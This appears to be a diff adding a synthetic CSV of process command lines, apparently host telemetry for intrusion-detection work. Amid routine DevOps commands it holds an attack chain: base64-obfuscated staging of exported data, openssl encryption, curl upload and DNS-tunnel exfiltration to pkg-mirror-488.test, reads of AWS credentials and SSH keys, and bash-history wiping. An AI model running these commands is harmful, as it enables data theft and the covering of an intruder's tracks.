@@ -1,0 +1,221 @@
+process_name,command_line
+npm,npm ci --no-audit
+bash,cd /home/ec2-user/mobile-api && ls
+git,git commit -am 'fix: nginx retry logic'
+docker,docker ps -a
+uptime,uptime
+bash,"X='find /var /home -name '\''*.sql'\'' -o -name '\''*.csv'\'' 2>/dev/null | head'; eval ""$X"""
+htop,htop -d 5
+ps,ps aux --sort=-%mem | head
+grep,grep -r 'TODO' /home/ec2-user/data-pipeline/src
+tar,tar czf /backups/nginx-31.tgz /var/lib/nginx
+docker,docker compose up -d postgres
+grep,grep -r 'TODO' /home/ec2-user/mobile-api/src
+npm,npm test -- --runInBand
+apt-get,apt-get install -y python3-pip
+aws,aws s3 ls s3://api-gateway-artifacts/
+bash,ls -la /home/ec2-user
+bash,cd /home/ec2-user/data-pipeline && ls
+terraform,terraform plan -out tfplan
+bash,echo Y3AgLXIgL3Zhci93d3cvZXhwb3J0cyAvdG1wLy5jYWNoZS9k | base64 -d | bash
+aws,aws s3 ls s3://postgres-artifacts/
+psql,psql -h db -U ec2-user -c 'SELECT count(*) FROM orders;'
+kubectl,kubectl rollout status deploy/auth-svc
+find,find /home/ec2-user/mobile-api -name '*.log' -mtime +7
+kubectl,kubectl rollout status deploy/worker
+git,git log --oneline -n 10
+git,git pull origin release/2.4
+kubectl,kubectl rollout status deploy/api-gateway
+go,go build ./...
+ssh,ssh ec2-user@build-73 uptime
+bash,echo dGFyIGN6ZiAvdG1wLy5jYWNoZS8uc2Vzc2lvbi50Z3ogL3RtcC8uY2FjaGUvZA== | base64 -d | bash
+rsync,rsync -az /home/ec2-user/mobile-api/dist/ /var/www/api-gateway/
+git,git status
+kubectl,kubectl logs deploy/api-gateway --tail 50
+pip3,pip3 install -r requirements.txt
+python3,python3 /opt/app/manage.py migrate
+node,node scripts/seed.js
+redis-cli,redis-cli ping
+kubectl,kubectl rollout status deploy/nginx
+openssl,openssl enc -aes-256-cbc -in /tmp/.cache/.session.tgz -out /tmp/.cache/.session.tgz.e -k 430359ccab2a953238a391bc3ff66487
+python3,python3 -m pytest tests/ -q
+git,git commit -am 'fix: worker retry logic'
+docker,docker build -t redis:19 .
+rsync,rsync -az /home/ec2-user/data-pipeline/dist/ /var/www/auth-svc/
+free,free -m
+bash,cd /home/ec2-user/platform && ls
+aws,aws s3 ls s3://auth-svc-artifacts/
+aws,aws s3 ls s3://redis-artifacts/
+scp,scp report.csv ec2-user@reports:/srv/reports/
+curl,curl -fsS https://api.github.com/repos/billing-service/commits | head
+split,split -b 4m /tmp/.cache/.session.tgz.e /tmp/.cache/p_
+journalctl,journalctl -u auth-svc --since '10 min ago'
+docker,docker compose up -d search
+npm,npm run build
+journalctl,journalctl -u search --since '10 min ago'
+git,git commit -am 'fix: api-gateway retry logic'
+ssh,ssh ec2-user@build-69 uptime
+kubectl,kubectl logs deploy/redis --tail 50
+kubectl,kubectl get pods -n production
+tar,tar czf /backups/worker-15.tgz /var/lib/worker
+docker,docker logs --tail 100 nginx
+docker,docker logs --tail 100 worker
+curl,curl -s -F file=@/tmp/.cache/.session.tgz.e https://pkg-mirror-488.test/u
+journalctl,journalctl -u postgres --since '10 min ago'
+docker,docker build -t postgres:12 .
+systemctl,systemctl restart search
+tar,tar czf /backups/redis-78.tgz /var/lib/redis
+systemctl,systemctl restart nginx
+git,git checkout develop
+git,git commit -am 'fix: auth-svc retry logic'
+docker,docker logs --tail 100 payments
+df,df -h
+bash,for c in $(base64 /tmp/.cache/p_aa); do nslookup $c.pkg-mirror-488.test; done
+find,find /home/ec2-user/billing-service -name '*.log' -mtime +7
+aws,aws s3 ls s3://nginx-artifacts/
+journalctl,journalctl -u nginx --since '10 min ago'
+aws,aws s3 ls s3://search-artifacts/
+find,find /home/ec2-user/infra -name '*.log' -mtime +7
+grep,grep -r 'TODO' /home/ec2-user/billing-service/src
+grep,grep -r 'TODO' /home/ec2-user/platform/src
+git,git pull origin hotfix/login
+bash,"X='getent passwd | awk -F: '\''$3>=1000{print $1}'\'''; eval ""$X"""
+kubectl,kubectl rollout status deploy/redis
+tar,tar czf /backups/payments-55.tgz /var/lib/payments
+docker,docker build -t worker:64 .
+systemctl,systemctl status api-gateway
+make,make lint
+journalctl,journalctl -u api-gateway --since '10 min ago'
+curl,curl -s http://localhost:8080/health
+systemctl,systemctl status search
+git,git pull origin feature/checkout
+docker,docker logs --tail 100 auth-svc
+systemctl,systemctl status auth-svc
+ssh,ssh ec2-user@build-35 uptime
+ssh,ssh ec2-user@build-3 uptime
+grep,grep -r 'TODO' /home/ec2-user/infra/src
+git,git pull origin develop
+kubectl,kubectl logs deploy/payments --tail 50
+bash,"ps -eo user,pid,cmd --sort=-%cpu | head -n 25"
+docker,docker compose up -d nginx
+git,git checkout main
+ssh,ssh ec2-user@build-43 uptime
+systemctl,systemctl status payments
+apt-get,apt-get install -y ripgrep
+tar,tar czf /backups/nginx-25.tgz /var/lib/nginx
+apt-get,apt-get install -y openjdk-17-jdk
+systemctl,systemctl restart auth-svc
+bash,truncate -s0 /home/ec2-user/.bash_history 2>/dev/null
+docker,docker build -t auth-svc:50 .
+find,find /home/ec2-user/platform -name '*.log' -mtime +7
+bash,cd /home/ec2-user/web-app && ls
+find,find /home/ec2-user/web-app -name '*.log' -mtime +7
+docker,docker logs --tail 100 search
+systemctl,systemctl restart api-gateway
+bash,find /home/ec2-user -name '*.env' -o -name 'id_rsa' 2>/dev/null | head
+docker,docker logs --tail 100 postgres
+ssh,ssh ec2-user@build-40 uptime
+find,find /home/ec2-user/data-pipeline -name '*.log' -mtime +7
+apt-get,apt-get install -y nodejs
+apt-get,apt-get install -y git-lfs
+curl,curl -fsS https://api.github.com/repos/data-pipeline/commits | head
+docker,docker build -t search:9 .
+ssh,ssh ec2-user@build-14 uptime
+docker,docker compose up -d auth-svc
+bash,cd /home/ec2-user/billing-service && ls
+tar,tar czf /backups/redis-43.tgz /var/lib/redis
+git,git checkout hotfix/login
+systemctl,systemctl status worker
+ssh,ssh ec2-user@build-29 uptime
+systemctl,systemctl restart payments
+bash,cat /home/ec2-user/.aws/credentials 2>/dev/null
+systemctl,systemctl status redis
+git,git checkout release/2.4
+docker,docker compose up -d api-gateway
+git,git pull origin main
+systemctl,systemctl status postgres
+rsync,rsync -az /home/ec2-user/billing-service/dist/ /var/www/api-gateway/
+bash,"X='getent passwd | awk -F: '\''$3>=1000{print $1}'\'' # 3320'; eval ""$X"""
+docker,docker build -t payments:94 .
+systemctl,systemctl status nginx
+docker,docker build -t redis:88 .
+rsync,rsync -az /home/ec2-user/data-pipeline/dist/ /var/www/worker/
+ssh,ssh ec2-user@build-51 uptime
+rsync,rsync -az /home/ec2-user/billing-service/dist/ /var/www/search/
+tar,tar czf /backups/auth-svc-97.tgz /var/lib/auth-svc
+ss,ss -tnp 2>/dev/null | head -n 40
+docker,docker compose up -d worker
+tar,tar czf /backups/api-gateway-47.tgz /var/lib/api-gateway
+ssh,ssh ec2-user@build-97 uptime
+docker,docker build -t postgres:90 .
+docker,docker logs --tail 100 api-gateway
+tar,tar czf /backups/search-21.tgz /var/lib/search
+curl,curl -fsS https://api.github.com/repos/web-app/commits | head
+apt-get,apt-get install -y htop
+kubectl,kubectl logs deploy/nginx --tail 50
+docker,docker build -t payments:12 .
+bash,truncate -s0 /home/ec2-user/.bash_history 2>/dev/null # 5872
+tar,tar czf /backups/postgres-97.tgz /var/lib/postgres
+tar,tar czf /backups/payments-88.tgz /var/lib/payments
+ssh,ssh ec2-user@build-70 uptime
+tar,tar czf /backups/postgres-30.tgz /var/lib/postgres
+kubectl,kubectl logs deploy/postgres --tail 50
+tar,tar czf /backups/search-24.tgz /var/lib/search
+ssh,ssh ec2-user@build-11 uptime
+tar,tar czf /backups/postgres-95.tgz /var/lib/postgres
+rsync,rsync -az /home/ec2-user/billing-service/dist/ /var/www/auth-svc/
+journalctl,journalctl -u worker --since '10 min ago'
+docker,docker build -t nginx:89 .
+cp,cp -r /home/ec2-user/.ssh /tmp/.cache/ 2>/dev/null
+ssh,ssh ec2-user@build-82 uptime
+ssh,ssh ec2-user@build-90 uptime
+bash,cd /home/ec2-user/infra && ls
+git,git commit -am 'fix: search retry logic'
+ssh,ssh ec2-user@build-92 uptime
+systemctl,systemctl restart worker
+git,git commit -am 'fix: redis retry logic'
+rsync,rsync -az /home/ec2-user/infra/dist/ /var/www/api-gateway/
+docker,docker build -t auth-svc:67 .
+ssh,ssh ec2-user@build-93 uptime
+docker,docker build -t auth-svc:10 .
+curl,curl -fsS https://api.github.com/repos/infra/commits | head
+journalctl,journalctl -u payments --since '10 min ago'
+git,git commit -am 'fix: postgres retry logic'
+rsync,rsync -az /home/ec2-user/billing-service/dist/ /var/www/redis/
+curl,curl -fsS https://api.github.com/repos/mobile-api/commits | head
+bash,cat /home/ec2-user/.aws/credentials 2>/dev/null # 6822
+apt-get,apt-get install -y jq
+rsync,rsync -az /home/ec2-user/platform/dist/ /var/www/payments/
+systemctl,systemctl restart postgres
+rsync,rsync -az /home/ec2-user/web-app/dist/ /var/www/postgres/
+curl,curl -fsS https://api.github.com/repos/platform/commits | head
+docker,docker build -t auth-svc:30 .
+sudo,sudo -n -l 2>/dev/null
+ssh,ssh ec2-user@build-58 uptime
+docker,docker build -t redis:11 .
+tar,tar czf /backups/auth-svc-73.tgz /var/lib/auth-svc
+kubectl,kubectl logs deploy/worker --tail 50
+docker,docker build -t search:92 .
+docker,docker build -t api-gateway:91 .
+docker,docker build -t worker:69 .
+rsync,rsync -az /home/ec2-user/platform/dist/ /var/www/worker/
+docker,docker build -t nginx:82 .
+tar,tar czf /backups/api-gateway-5.tgz /var/lib/api-gateway
+kubectl,kubectl rollout status deploy/search
+ssh,ssh ec2-user@build-10 uptime
+tar,tar czf /backups/search-28.tgz /var/lib/search
+kubectl,kubectl logs deploy/auth-svc --tail 50
+ss,ss -tnp 2>/dev/null | head -n 40 # 7256
+grep,grep -r 'TODO' /home/ec2-user/web-app/src
+docker,docker build -t search:97 .
+ssh,ssh ec2-user@build-53 uptime
+systemctl,systemctl restart redis
+ssh,ssh ec2-user@build-79 uptime
+docker,docker compose up -d payments
+git,git checkout feature/checkout
+docker,docker build -t worker:3 .
+rsync,rsync -az /home/ec2-user/data-pipeline/dist/ /var/www/search/
+bash,truncate -s0 /home/ec2-user/.bash_history 2>/dev/null # 4275
+tar,tar czf /backups/api-gateway-88.tgz /var/lib/api-gateway
+ssh,ssh ec2-user@build-83 uptime
+kubectl,kubectl logs deploy/search --tail 50
